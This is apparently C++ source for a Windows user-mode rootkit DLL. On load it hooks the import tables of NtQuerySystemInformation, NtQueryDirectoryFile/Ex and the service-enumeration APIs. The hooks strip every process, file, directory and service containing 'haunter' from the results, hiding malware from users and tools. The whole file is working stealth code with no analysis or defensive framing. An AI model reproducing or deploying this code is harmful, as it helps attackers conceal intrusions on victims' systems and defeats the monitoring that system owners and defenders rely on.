#include <Windows.h>
#include <Shlwapi.h>

#include "IAT Hook.h"
#include "WinStruct.h"

#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)

using lpNtQuerySystemInformation = NTSTATUS(WINAPI*)(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength);
lpNtQuerySystemInformation lpOrgNtQuerySystemInformation;

using lpNtQueryDirectoryFile = NTSTATUS(WINAPI*)(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan);
lpNtQueryDirectoryFile lpOrgNtQueryDirectoryFile;

using lpNtQueryDirectoryFileEx = NTSTATUS(WINAPI*)(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName, BOOLEAN RestartScan, BOOLEAN ReturnSingleEntry);
lpNtQueryDirectoryFileEx lpOrgNtQueryDirectoryFileEx;


char lpCurrentProcessName[MAX_PATH];
char lpCurrentDirectoryName[MAX_PATH];

using lpEnumServiceGroupW = BOOL(WINAPI*)(SC_HANDLE, DWORD, DWORD, LPBYTE, DWORD, LPDWORD, LPDWORD, LPDWORD, LPVOID);
using lpEnumServicesStatusExW = BOOL(WINAPI*)(SC_HANDLE, SC_ENUM_TYPE, DWORD, DWORD, LPBYTE, DWORD, LPDWORD, LPDWORD, LPDWORD, LPCWSTR);

lpEnumServiceGroupW lpOrgEnumServiceGroupW;
lpEnumServicesStatusExW lpOrgEnumServicesStatusExW;

BOOL CheckPrefix(PCWSTR src) {
	if (src && StrStrNIW(src, L"haunter", wcslen(L"haunter"))) {
		return TRUE;
	}
	else {
		return FALSE;
	}
}

NTSTATUS WINAPI hkNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
	const NTSTATUS QueryStatus = lpOrgNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (SystemInformationClass == _SYSTEM_INFORMATION_CLASS::SystemProcessInformation && QueryStatus == STATUS_SUCCESS)
	{
		PSYSTEM_PROCESS_INFORMATION lpCurrentProcess;
		auto lpNextProcess = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

		do
		{
			lpCurrentProcess = lpNextProcess;
			lpNextProcess = (PSYSTEM_PROCESS_INFORMATION)((DWORD_PTR)lpCurrentProcess + lpCurrentProcess->NextEntryOffset);

			wcstombs_s(nullptr, lpCurrentProcessName, lpNextProcess->ImageName.Buffer, MAX_PATH);
			lpCurrentProcessName[MAX_PATH - 1] = '\0';

			if (StrStrIA(lpCurrentProcessName, "haunter"))
			{
				if (lpNextProcess->NextEntryOffset == 0)
					lpCurrentProcess->NextEntryOffset = 0;
				else
					lpCurrentProcess->NextEntryOffset += lpNextProcess->NextEntryOffset;

				lpNextProcess = lpCurrentProcess;
			}

		} while (lpCurrentProcess->NextEntryOffset != 0);
	}

	return QueryStatus;
}

NTSTATUS WINAPI hkNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan)
{
	const NTSTATUS QueryStatus = lpOrgNtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);
	if (FileInformationClass == FILE_INFORMATION_CLASS::FileIdBothDirectoryInformation && QueryStatus == STATUS_SUCCESS)
	{
		PFILE_ID_BOTH_DIR_INFORMATION lpCurrentDirectory;
		auto lpNextDirectory = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;

		do
		{
			lpCurrentDirectory = lpNextDirectory;
			lpNextDirectory = (PFILE_ID_BOTH_DIR_INFORMATION)((DWORD_PTR)lpCurrentDirectory + lpCurrentDirectory->NextEntryOffset);

			wcstombs_s(nullptr, lpCurrentDirectoryName, lpNextDirectory->FileName, MAX_PATH);
			lpCurrentDirectoryName[MAX_PATH - 1] = '\0';

			if (StrStrIA(lpCurrentDirectoryName, "haunter"))
			{
				if (lpNextDirectory->NextEntryOffset == 0)
					lpCurrentDirectory->NextEntryOffset = 0;
				else
					lpCurrentDirectory->NextEntryOffset += lpNextDirectory->NextEntryOffset;

				lpNextDirectory = lpCurrentDirectory;
			}

		} while (lpCurrentDirectory->NextEntryOffset != 0);
	}

	return QueryStatus;
}

NTSTATUS WINAPI hkNtQueryDirectoryFileEx(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName, BOOLEAN RestartScan, BOOLEAN ReturnSingleEntry)
{
	const NTSTATUS QueryStatus = lpOrgNtQueryDirectoryFileEx(FileHandle, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName, RestartScan, ReturnSingleEntry);

	if (FileInformationClass == FILE_INFORMATION_CLASS::FileIdBothDirectoryInformation && QueryStatus == STATUS_SUCCESS)
	{
		PFILE_ID_BOTH_DIR_INFORMATION lpCurrentDirectory;
		auto lpNextDirectory = (PFILE_ID_BOTH_DIR_INFORMATION)FileInformation;

		do
		{
			lpCurrentDirectory = lpNextDirectory;
			lpNextDirectory = (PFILE_ID_BOTH_DIR_INFORMATION)((DWORD_PTR)lpCurrentDirectory + lpCurrentDirectory->NextEntryOffset);

			wcstombs_s(nullptr, lpCurrentDirectoryName, lpNextDirectory->FileName, MAX_PATH);
			lpCurrentDirectoryName[MAX_PATH - 1] = '\0';

			if (StrStrIA(lpCurrentDirectoryName, "haunter"))
			{
				if (lpNextDirectory->NextEntryOffset == 0)
					lpCurrentDirectory->NextEntryOffset = 0;
				else
					lpCurrentDirectory->NextEntryOffset += lpNextDirectory->NextEntryOffset;

				lpNextDirectory = lpCurrentDirectory;
			}

		} while (lpCurrentDirectory->NextEntryOffset != 0);
	}

	return QueryStatus;
}


static BOOL WINAPI HookedEnumServiceGroupW(SC_HANDLE serviceManager, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPVOID reserved)
{
	BOOL result = lpOrgEnumServiceGroupW(serviceManager, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, reserved);

	if (result && services && servicesReturned)
	{
		LPENUM_SERVICE_STATUSW serviceStatus = (LPENUM_SERVICE_STATUSW)services;
		DWORD currentIndex = 0;

		for (DWORD i = 0; i < *servicesReturned; i++)
		{
			if (!CheckPrefix(serviceStatus[i].lpServiceName))
			{
				serviceStatus[currentIndex] = serviceStatus[i];
				currentIndex++;
			}
		}
		*servicesReturned = currentIndex;
	}

	return result;
}

static BOOL WINAPI HookedEnumServicesStatusExW(SC_HANDLE serviceManager, SC_ENUM_TYPE infoLevel, DWORD serviceType, DWORD serviceState, LPBYTE services, DWORD servicesLength, LPDWORD bytesNeeded, LPDWORD servicesReturned, LPDWORD resumeHandle, LPCWSTR groupName)
{
	BOOL result = lpOrgEnumServicesStatusExW(serviceManager, infoLevel, serviceType, serviceState, services, servicesLength, bytesNeeded, servicesReturned, resumeHandle, groupName);

	if (result && services && servicesReturned)
	{
		LPENUM_SERVICE_STATUS_PROCESSW serviceStatus = (LPENUM_SERVICE_STATUS_PROCESSW)services;
		DWORD currentIndex = 0;

		for (DWORD i = 0; i < *servicesReturned; i++)
		{
			if (!CheckPrefix(serviceStatus[i].lpServiceName))
			{
				serviceStatus[currentIndex] = serviceStatus[i];
				currentIndex++;
			}
		}
		*servicesReturned = currentIndex;
	}

	return result;
}



void InitHook()
{
	lpOrgNtQuerySystemInformation = (lpNtQuerySystemInformation)IAT::Hook("ntdll.dll", "NtQuerySystemInformation", &hkNtQuerySystemInformation);
	lpOrgNtQueryDirectoryFile = (lpNtQueryDirectoryFile)IAT::Hook("ntdll.dll", "NtQueryDirectoryFile", &hkNtQueryDirectoryFile, "windows.storage.dll");
	lpOrgNtQueryDirectoryFileEx = (lpNtQueryDirectoryFileEx)IAT::Hook("ntdll.dll", "NtQueryDirectoryFileEx", &hkNtQueryDirectoryFileEx);
	lpOrgEnumServiceGroupW = (lpEnumServiceGroupW)IAT::Hook("advapi32.dll", "EnumServiceGroupW", &HookedEnumServiceGroupW);
	lpOrgEnumServicesStatusExW = (lpEnumServicesStatusExW)IAT::Hook("advapi32.dll", "EnumServicesStatusExW", &HookedEnumServicesStatusExW);
	ExitThread(0);
}

void RemoveHookAndFreeLibrary(const HMODULE hModule)
{
	IAT::Hook("ntdll.dll", "NtQuerySystemInformation", (LPVOID)lpOrgNtQuerySystemInformation);
	IAT::Hook("ntdll.dll", "NtQueryDirectoryFile", (LPVOID)lpOrgNtQueryDirectoryFile, "windows.storage.dll");
	IAT::Hook("ntdll.dll", "NtQueryDirectoryFileEx", (LPVOID)lpOrgNtQueryDirectoryFileEx);
	IAT::Hook("advapi32.dll", "EnumServiceGroupW", (LPVOID)lpOrgEnumServiceGroupW);
	IAT::Hook("advapi32.dll", "EnumServicesStatusExW", (LPVOID)lpOrgEnumServicesStatusExW);
	FreeLibraryAndExitThread(hModule, 0);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		DisableThreadLibraryCalls(hModule);
		CreateThread(nullptr, NULL, (LPTHREAD_START_ROUTINE)InitHook, nullptr, 0, nullptr);
		break;

	case DLL_PROCESS_DETACH:
		RemoveHookAndFreeLibrary(hModule);
		break;

	default:
		return FALSE;
	}

	return TRUE;
}